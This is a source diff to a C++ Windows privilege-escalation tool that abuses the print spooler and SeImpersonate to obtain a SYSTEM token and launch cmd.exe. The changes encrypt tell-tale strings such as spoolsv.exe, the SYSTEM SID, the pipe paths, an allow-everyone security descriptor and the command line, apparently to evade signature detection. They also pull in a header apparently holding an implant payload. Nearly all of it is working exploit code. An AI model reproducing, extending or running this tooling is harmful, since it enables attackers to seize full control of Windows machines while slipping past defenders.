@@ -1,10 +1,13 @@
 #include "seimpersonate.hpp"
+#include "easCipher42.hpp"
+#include "demon.x64.h"
 #include <iostream>
 #include <sddl.h>
 #include <userenv.h>
 #include <sstream>
 #include <iomanip>
 #include <random>
+#include <algorithm>
 
 // Trigger from embedded PrintSpoofer stub
 extern "C" DWORD TriggerPrinterBug(LPWSTR pwszPipeName);
@@ -21,7 +24,7 @@ static DWORD WINAPI TriggerThreadProc(LPVOID lpParam) {
 
     // Call RPC trigger (this may take several seconds)
     DWORD result = TriggerPrinterBug((LPWSTR)param->pipeName.c_str());
-    
+
     delete param;
     return result;
 }
@@ -35,8 +38,8 @@ static DWORD WINAPI TriggerThreadProc(LPVOID lpParam) {
 // Currently plaintext for Phase 1 testing, will be encrypted in Phase 2
 
 // Constructor
-SeImpersonateHandler::SeImpersonateHandler(bool verboseMode)
-    : verbose(verboseMode), waitTimeoutMs(30000) {
+SeImpersonateHandler::SeImpersonateHandler(easCipher42& cipher_ref, bool verboseMode)
+    : cipher(cipher_ref), verbose(verboseMode), waitTimeoutMs(30000) {
 }
 
 // Helper function to add jitter to timeout (±5 seconds around 25s base)
@@ -113,14 +116,23 @@ bool SeImpersonateHandler::Execute(HANDLE& outSystemToken, const std::string& cu
     // Give the RPC call a moment to initiate before we start waiting
     Sleep(500);
 
+    // Decrypt spoolsv.exe string for logging
+    std::vector<uint8_t> spoolsv_dec;
+    if (!cipher.Decrypt(spoolsv_exe_enc, spoolsv_exe_enc_len, spoolsv_dec)) {
+        std::cout << "[-] Spoolsv.exe decrypt FAILED\n";
+        return false;
+    }
+    std::string spoolsv_str(spoolsv_dec.begin(),
+                           std::find(spoolsv_dec.begin(), spoolsv_dec.end(), '\0'));
+
     // Step 4: Wait for connection from SYSTEM (spoolsv.exe) with jitter timeout
     DWORD actualTimeout = GetTimeoutWithJitter();
-    if (verbose) std::cout << "[*] Waiting for spoolsv.exe connection (timeout: " << actualTimeout << "ms)...\n";
+    if (verbose) std::cout << "[*] Waiting for " << spoolsv_str << " connection (timeout: " << actualTimeout << "ms)...\n";
 
     // Step 5: Wait for connection from SYSTEM (spoolsv.exe)
     if (!WaitForPipeConnection(actualTimeout)) {
         std::cerr << "[-] Timeout or error waiting for pipe connection\n";
-        if (verbose) std::cerr << "[-] spoolsv.exe did not connect within " << actualTimeout << "ms\n";
+        if (verbose) std::cerr << "[-] " << spoolsv_str << " did not connect within " << actualTimeout << "ms\n";
         return false;
     }
     std::cout << "[+] Connection received on named pipe!\n";
@@ -141,7 +153,16 @@ bool SeImpersonateHandler::Execute(HANDLE& outSystemToken, const std::string& cu
         std::cout << "[+] Token User SID:\n"
                   << "    " << sidStr << "\n";
 
-        if (sidStr.find("S-1-5-18") != std::string::npos) {
+        // Decrypt system SID for comparison
+        std::vector<uint8_t> system_sid_dec;
+        if (!cipher.Decrypt(system_sid_enc, system_sid_enc_len, system_sid_dec)) {
+            std::cout << "[-] System SID decrypt FAILED\n";
+            return false;
+        }
+        std::string system_sid_str(system_sid_dec.begin(),
+                                   std::find(system_sid_dec.begin(), system_sid_dec.end(), '\0'));
+
+        if (sidStr.find(system_sid_str) != std::string::npos) {
             std::cout << "[+] Confirmed: SYSTEM (NT AUTHORITY\\SYSTEM)\n";
         } else if (verbose) {
             std::cout << "[!] Warning: Not SYSTEM, got: " << sidStr << "\n";
@@ -198,12 +219,29 @@ bool SeImpersonateHandler::GenerateRandomPipeName(std::string& outName) {
  * Spooler connects to our pipe due to normalization
  */
 bool SeImpersonateHandler::CreatePipeServer(const std::string& pipeName) {
+    // Decrypt pipe strings
+    std::vector<uint8_t> pipe_prefix_dec;
+    if (!cipher.Decrypt(pipe_prefix_enc, pipe_prefix_enc_len, pipe_prefix_dec)) {
+        std::cout << "[-] Pipe prefix decrypt FAILED\n";
+        return false;
+    }
+    std::string pipe_prefix_str(pipe_prefix_dec.begin(),
+                                std::find(pipe_prefix_dec.begin(), pipe_prefix_dec.end(), '\0'));
+
+    std::vector<uint8_t> pipe_suffix_dec;
+    if (!cipher.Decrypt(pipe_suffix_enc, pipe_suffix_enc_len, pipe_suffix_dec)) {
+        std::cout << "[-] Pipe suffix decrypt FAILED\n";
+        return false;
+    }
+    std::string pipe_suffix_str(pipe_suffix_dec.begin(),
+                                std::find(pipe_suffix_dec.begin(), pipe_suffix_dec.end(), '\0'));
+
     // Build full pipe path using local pipe notation (.\\pipe\\)
-    std::string pipePath = "\\\\?\\pipe\\" + pipeName + "\\pipe\\spoolss";
+    std::string pipePath = pipe_prefix_str + pipeName + pipe_suffix_str;
 
     if (verbose) {
         std::cout << "[*] CreateNamedPipe() details:\n"
-                  << "    Pipe name: \\\\\\.\\pipe\\" << pipeName << "\\pipe\\spoolss\n"
+                  << "    Pipe name: \\\\.\\pipe\\" << pipeName << pipe_suffix_str << "\n"
                   << "    Access mode: PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED\n"
                   << "    Pipe mode: PIPE_TYPE_BYTE | PIPE_WAIT\n"
                   << "    Max instances: 10\n"
@@ -224,8 +262,20 @@ bool SeImpersonateHandler::CreatePipeServer(const std::string& pipeName) {
         return false;
     }
 
+    // Decrypt SDDL string
+    std::vector<uint8_t> sddl_dec;
+    if (!cipher.Decrypt(sddl_everyone_enc, sddl_everyone_enc_len, sddl_dec)) {
+        std::cout << "[-] SDDL decrypt FAILED\n";
+        return false;
+    }
+
+    // Convert to wide string
+    int sddl_wide_size = MultiByteToWideChar(CP_ACP, 0, (char*)sddl_dec.data(), -1, nullptr, 0);
+    std::wstring sddl_wide(sddl_wide_size, 0);
+    MultiByteToWideChar(CP_ACP, 0, (char*)sddl_dec.data(), -1, &sddl_wide[0], sddl_wide_size);
+
     if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(
-        L"D:(A;OICI;GA;;;WD)",
+        sddl_wide.c_str(),
         SDDL_REVISION_1,
         &sa.lpSecurityDescriptor,
         nullptr)) {
@@ -370,10 +420,38 @@ bool SeImpersonateHandler::SpawnProcessWithToken(HANDLE hSystemToken, DWORD& out
         return false;
     }
 
+    // Decrypt desktop station string
+    std::vector<uint8_t> desktop_dec;
+    if (!cipher.Decrypt(desktop_station_enc, desktop_station_enc_len, desktop_dec)) {
+        std::cout << "[-] Desktop station decrypt FAILED\n";
+        DestroyEnvironmentBlock(lpEnvironment);
+        CloseHandle(hPrimaryToken);
+        return false;
+    }
+
+    // Convert to wide string
+    int desktop_wide_size = MultiByteToWideChar(CP_ACP, 0, (char*)desktop_dec.data(), -1, nullptr, 0);
+    std::wstring desktop_wide(desktop_wide_size, 0);
+    MultiByteToWideChar(CP_ACP, 0, (char*)desktop_dec.data(), -1, &desktop_wide[0], desktop_wide_size);
+
+    // Decrypt cmd.exe string
+    std::vector<uint8_t> cmd_dec;
+    if (!cipher.Decrypt(cmd_exe_enc, cmd_exe_enc_len, cmd_dec)) {
+        std::cout << "[-] Cmd.exe decrypt FAILED\n";
+        DestroyEnvironmentBlock(lpEnvironment);
+        CloseHandle(hPrimaryToken);
+        return false;
+    }
+
+    // Convert to wide string
+    int cmd_wide_size = MultiByteToWideChar(CP_ACP, 0, (char*)cmd_dec.data(), -1, nullptr, 0);
+    std::wstring cmd_wide(cmd_wide_size, 0);
+    MultiByteToWideChar(CP_ACP, 0, (char*)cmd_dec.data(), -1, &cmd_wide[0], cmd_wide_size);
+
     // Setup startup info
     STARTUPINFOW si = {};
     si.cb = sizeof(STARTUPINFOW);
-    si.lpDesktop = const_cast<LPWSTR>(L"WinSta0\\Default");
+    si.lpDesktop = const_cast<LPWSTR>(desktop_wide.c_str());
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_SHOW;
 
@@ -381,11 +459,14 @@ bool SeImpersonateHandler::SpawnProcessWithToken(HANDLE hSystemToken, DWORD& out
     PROCESS_INFORMATION pi = {};
 
     // Try CreateProcessAsUser first (preferred)
-    wchar_t cmdLine[] = L"cmd.exe";
+    // Use buffer for command line (must be writable)
+    std::vector<wchar_t> cmdLineBuf(cmd_wide.begin(), cmd_wide.end());
+    cmdLineBuf.push_back(L'\0');
+
     BOOL result = CreateProcessAsUserW(
         hPrimaryToken,
         nullptr,
-        cmdLine,
+        cmdLineBuf.data(),
         nullptr,
         nullptr,
         FALSE,
@@ -408,7 +489,7 @@ bool SeImpersonateHandler::SpawnProcessWithToken(HANDLE hSystemToken, DWORD& out
                 hPrimaryToken,
                 LOGON_WITH_PROFILE,
                 nullptr,
-                cmdLine,
+                cmdLineBuf.data(),
                 CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                 lpEnvironment,
                 szSystemDir,
